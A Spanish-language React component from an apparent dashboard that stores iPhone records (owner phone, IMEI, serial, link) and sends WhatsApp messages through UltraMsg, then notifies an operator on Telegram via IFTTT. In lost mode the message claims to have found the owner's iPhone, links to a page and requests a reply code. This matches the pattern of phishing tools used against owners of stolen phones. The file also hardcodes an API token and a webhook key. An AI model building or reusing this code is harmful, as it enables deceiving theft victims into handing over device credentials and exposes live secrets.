
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { Send, Trash2, Eye, EyeOff, MessageSquare, Smartphone } from 'lucide-react';
import { getIphoneImage } from '@/utils/iphoneImages';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode: boolean;
  status: string;
  created_at: string;
}

interface ProcessListProps {
  userType?: 'admin' | 'user';
}

const ProcessList = ({ userType = 'user' }: ProcessListProps) => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(true);
  const [sendingStates, setSendingStates] = useState<{[key: string]: boolean}>({});
  const [expandedCard, setExpandedCard] = useState<string | null>(null);

  useEffect(() => {
    loadProcesses();
  }, []);

  const loadProcesses = async () => {
    try {
      console.log('Cargando procesos...');
      
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) {
        toast({
          title: "Error de Autenticación",
          description: "Debes iniciar sesión para ver los procesos",
          variant: "destructive",
        });
        return;
      }

      let query = supabase
        .from('processes')
        .select('*')
        .order('created_at', { ascending: false });

      if (userType === 'user') {
        query = query.eq('user_id', session.user.id);
      }

      const { data, error } = await query;

      if (error) {
        console.error('Error al cargar procesos:', error);
        throw error;
      }

      console.log('Procesos cargados:', data);
      setProcesses(data || []);
    } catch (error: any) {
      console.error('Error completo al cargar procesos:', error);
      toast({
        title: "Error",
        description: error.message || "Error al cargar los procesos",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleSendMessage = async (process: Process) => {
    const processId = process.id;
    
    if (sendingStates[processId]) return;
    
    setSendingStates(prev => ({...prev, [processId]: true}));
    
    try {
      console.log('Enviando mensaje para proceso:', processId);
      
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) {
        toast({
          title: "Error de Autenticación",
          description: "Debes iniciar sesión para enviar mensajes",
          variant: "destructive",
        });
        return;
      }

      // Obtener configuración de la instancia
      const { data: settings } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', ['whatsapp_instance', 'whatsapp_token']);

      const config = settings?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      const instance = config?.whatsapp_instance || 'instance126876';
      const token = config?.whatsapp_token || '4ecj8581tubua7ry';

      // Generar ID único de seguimiento
      const trackingId = Math.random().toString(36).substr(2, 9);
      
      // Crear mensaje personalizado basado en el proceso
      let messageContent = '';
      
      if (process.lost_mode) {
        // Mensaje para modo perdido
        messageContent = `🔍 *IPHONE ENCONTRADO*

📱 *Modelo:* ${process.iphone_model}
💾 *Almacenamiento:* ${process.storage}
🎨 *Color:* ${process.color}
📞 *IMEI:* ${process.imei}
🔢 *Serie:* ${process.serial_number}

👋 Hola! Encontré tu dispositivo ${process.iphone_model} ${process.color} de ${process.storage}.

${process.contact_type === 'propietario' ? 
  `Si eres ${process.owner_name || process.client_name}, por favor responde con el código: *${trackingId}*` :
  `Si conoces al propietario (${process.owner_name || process.client_name}), por favor comparte este mensaje. Responde con: *${trackingId}*`
}

${process.url ? `\n🔗 Más información: ${process.url}` : ''}

⚠️ *Importante:* Responde SOLO con el código para verificar que eres el propietario.`;
      } else {
        // Mensaje estándar
        messageContent = `📱 *INFORMACIÓN DE TU DISPOSITIVO*

👤 *Cliente:* ${process.client_name}
📱 *Modelo:* ${process.iphone_model}
💾 *Almacenamiento:* ${process.storage}
🎨 *Color:* ${process.color}
📞 *IMEI:* ${process.imei}
🔢 *Serie:* ${process.serial_number}

${process.contact_type === 'propietario' ? 
  `Hola ${process.owner_name || process.client_name}!` :
  `Contacto de emergencia para ${process.owner_name || process.client_name}.`
}

Por favor, responde con el código: *${trackingId}*

${process.url ? `\n🔗 Información adicional: ${process.url}` : ''}

💬 Responde solo con el código para continuar.`;
      }

      // URL para enviar mensaje
      const whatsappUrl = `https://api.ultramsg.com/${instance}/messages/chat`;
      
      const payload = {
        token: token,
        to: `${process.country_code}${process.phone_number}`,
        body: messageContent,
        priority: 1
      };

      console.log('Enviando a WhatsApp:', payload);

      const response = await fetch(whatsappUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      console.log('Respuesta de WhatsApp:', result);

      if (!response.ok) {
        throw new Error(result.error || 'Error al enviar mensaje de WhatsApp');
      }

      // Guardar el mensaje en la base de datos
      const { error: messageError } = await supabase
        .from('messages')
        .insert({
          user_id: session.user.id,
          process_id: processId,
          message_content: messageContent,
          recipient_phone: `${process.country_code}${process.phone_number}`,
          status: 'enviado'
        });

      if (messageError) {
        console.error('Error al guardar mensaje:', messageError);
      }

      // Crear mensaje mejorado para Telegram con más información del proceso
      const telegramMessage = `🔔 *PROCESO WHATSAPP ENVIADO*

👩🏽‍💻 *Server Astro*

📊 *INFORMACIÓN DEL PROCESO:*
👤 *Cliente:* ${process.client_name}
📱 *Modelo:* ${process.iphone_model}
💾 *Almacenamiento:* ${process.storage}
🎨 *Color:* ${process.color}
📞 *IMEI:* ${process.imei}
🔢 *Serie:* ${process.serial_number}
${process.owner_name ? `👥 *Propietario:* ${process.owner_name}` : ''}

📞 *Número destino:* ${process.country_code} ${process.phone_number}
📥 *Código de seguimiento:* ${trackingId}
${process.lost_mode ? '🔒 *Modo perdido:* Activado' : ''}

🤖 *Bot Astro online* 🟢`;

      console.log('Enviando notificación a Telegram:', telegramMessage);

      // Enviar notificación a Telegram (IFTTT)
      const iftttUrl = 'https://maker.ifttt.com/trigger/whatsapp_alert/with/key/dwmF-vQx4wKNg6o_T1Jbqc';
      
      await fetch(iftttUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          value1: telegramMessage,
          value2: trackingId,
          value3: `${process.client_name} - ${process.iphone_model}`
        })
      });

      toast({
        title: "Mensaje enviado",
        description: `Mensaje enviado exitosamente a ${process.country_code} ${process.phone_number}`,
      });

      // Actualizar el estado del proceso
      await supabase
        .from('processes')
        .update({ 
          status: 'enviado',
          updated_at: new Date().toISOString()
        })
        .eq('id', processId);

      // Recargar procesos
      loadProcesses();

    } catch (error: any) {
      console.error('Error completo al enviar mensaje:', error);
      toast({
        title: "Error",
        description: error.message || "Error al enviar el mensaje. Intenta nuevamente.",
        variant: "destructive",
      });
    } finally {
      setSendingStates(prev => ({...prev, [processId]: false}));
    }
  };

  const handleDeleteProcess = async (processId: string) => {
    try {
      console.log('Eliminando proceso:', processId);
      
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) {
        console.error('Error al eliminar proceso:', error);
        throw error;
      }

      toast({
        title: "Proceso eliminado",
        description: "El proceso se ha eliminado exitosamente",
      });

      // Recargar procesos
      loadProcesses();
    } catch (error: any) {
      console.error('Error completo al eliminar proceso:', error);
      toast({
        title: "Error",
        description: error.message || "Error al eliminar el proceso",
        variant: "destructive",
      });
    }
  };

  const toggleCardExpansion = (processId: string) => {
    setExpandedCard(expandedCard === processId ? null : processId);
  };

  if (loading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="p-8">
          <div className="text-center text-blue-200">Cargando procesos...</div>
        </CardContent>
      </Card>
    );
  }

  if (processes.length === 0) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardHeader>
          <CardTitle className="text-blue-300">Procesos Guardados</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="text-center py-8">
            <MessageSquare className="h-16 w-16 text-blue-400 mx-auto mb-4 opacity-50" />
            <p className="text-blue-200/70 text-lg mb-2">No hay procesos guardados</p>
            <p className="text-blue-200/50 text-sm">
              Los procesos que agregues aparecerán aquí listos para enviar.
            </p>
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-4">
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardHeader>
          <CardTitle className="text-blue-300 flex items-center gap-2">
            <MessageSquare className="h-5 w-5" />
            Procesos Guardados ({processes.length})
          </CardTitle>
        </CardHeader>
      </Card>

      <ScrollArea className="h-[600px]">
        <div className="space-y-4 pr-4">
          {processes.map((process) => {
            const isExpanded = expandedCard === process.id;
            const iphoneImage = getIphoneImage(process.iphone_model, process.color);
            
            return (
              <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20 hover:border-blue-400/30 transition-all duration-200">
                <CardContent className="p-6">
                  <div className="flex items-start gap-4">
                    {/* Imagen del iPhone */}
                    <div className="flex-shrink-0">
                      <div className="w-16 h-20 bg-gradient-to-b from-blue-500/10 to-purple-500/10 rounded-lg flex items-center justify-center border border-blue-500/20">
                        {iphoneImage ? (
                          <img 
                            src={iphoneImage} 
                            alt={process.iphone_model}
                            className="w-12 h-16 object-contain"
                          />
                        ) : (
                          <Smartphone className="h-8 w-8 text-blue-400" />
                        )}
                      </div>
                    </div>

                    {/* Información principal */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-start justify-between mb-3">
                        <div>
                          <h3 className="text-lg font-semibold text-blue-200 mb-1">
                            {process.client_name}
                          </h3>
                          <p className="text-blue-300 text-sm">
                            {process.iphone_model} • {process.storage} • {process.color}
                          </p>
                        </div>
                        <div className="flex items-center gap-2">
                          <Badge 
                            variant={process.status === 'enviado' ? 'default' : 'secondary'}
                            className={
                              process.status === 'enviado' 
                                ? 'bg-green-600/20 text-green-300 border-green-500/30' 
                                : 'bg-yellow-600/20 text-yellow-300 border-yellow-500/30'
                            }
                          >
                            {process.status === 'enviado' ? 'Enviado' : 'Pendiente'}
                          </Badge>
                          {process.lost_mode && (
                            <Badge className="bg-red-600/20 text-red-300 border-red-500/30">
                              Modo Perdido
                            </Badge>
                          )}
                        </div>
                      </div>

                      {/* Información básica siempre visible */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm mb-4">
                        <div>
                          <span className="text-blue-400">Teléfono:</span>
                          <span className="text-blue-200 ml-2">{process.country_code} {process.phone_number}</span>
                        </div>
                        <div>
                          <span className="text-blue-400">IMEI:</span>
                          <span className="text-blue-200 ml-2 font-mono">{process.imei}</span>
                        </div>
                      </div>

                      {/* Información expandible */}
                      {isExpanded && (
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm mb-4 p-3 bg-blue-950/20 rounded-lg border border-blue-500/10">
                          <div>
                            <span className="text-blue-400">Tipo contacto:</span>
                            <span className="text-blue-200 ml-2 capitalize">{process.contact_type}</span>
                          </div>
                          {process.owner_name && (
                            <div>
                              <span className="text-blue-400">Propietario:</span>
                              <span className="text-blue-200 ml-2">{process.owner_name}</span>
                            </div>
                          )}
                          <div>
                            <span className="text-blue-400">Serie:</span>
                            <span className="text-blue-200 ml-2 font-mono">{process.serial_number}</span>
                          </div>
                          {process.url && (
                            <div>
                              <span className="text-blue-400">URL:</span>
                              <span className="text-blue-200 ml-2 break-all">{process.url}</span>
                            </div>
                          )}
                          <div>
                            <span className="text-blue-400">Creado:</span>
                            <span className="text-blue-200 ml-2">
                              {new Date(process.created_at).toLocaleDateString('es-ES', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </span>
                          </div>
                        </div>
                      )}

                      {/* Botones de acción */}
                      <div className="flex items-center gap-2 pt-2">
                        <Button
                          onClick={() => handleSendMessage(process)}
                          disabled={sendingStates[process.id]}
                          className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white flex-1 sm:flex-none"
                        >
                          <Send className="h-4 w-4 mr-2" />
                          {sendingStates[process.id] ? 'Enviando...' : 'Enviar Mensaje'}
                        </Button>

                        <Button
                          onClick={() => toggleCardExpansion(process.id)}
                          variant="outline"
                          size="sm"
                          className="border-blue-500/30 text-blue-300 hover:bg-blue-600/20"
                        >
                          {isExpanded ? (
                            <EyeOff className="h-4 w-4" />
                          ) : (
                            <Eye className="h-4 w-4" />
                          )}
                        </Button>

                        <AlertDialog>
                          <AlertDialogTrigger asChild>
                            <Button
                              variant="outline"
                              size="sm"
                              className="border-red-500/30 text-red-300 hover:bg-red-600/20"
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </AlertDialogTrigger>
                          <AlertDialogContent className="bg-slate-900 border-red-500/20">
                            <AlertDialogHeader>
                              <AlertDialogTitle className="text-red-300">¿Eliminar proceso?</AlertDialogTitle>
                              <AlertDialogDescription className="text-slate-300">
                                Esta acción no se puede deshacer. Se eliminará permanentemente el proceso de {process.client_name}.
                              </AlertDialogDescription>
                            </AlertDialogHeader>
                            <AlertDialogFooter>
                              <AlertDialogCancel className="border-slate-600 text-slate-300 hover:bg-slate-800">
                                Cancelar
                              </AlertDialogCancel>
                              <AlertDialogAction
                                onClick={() => handleDeleteProcess(process.id)}
                                className="bg-red-600 hover:bg-red-700 text-white"
                              >
                                Eliminar
                              </AlertDialogAction>
                            </AlertDialogFooter>
                          </AlertDialogContent>
                        </AlertDialog>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            );
          })}
        </div>
      </ScrollArea>
    </div>
  );
};

export default ProcessList;
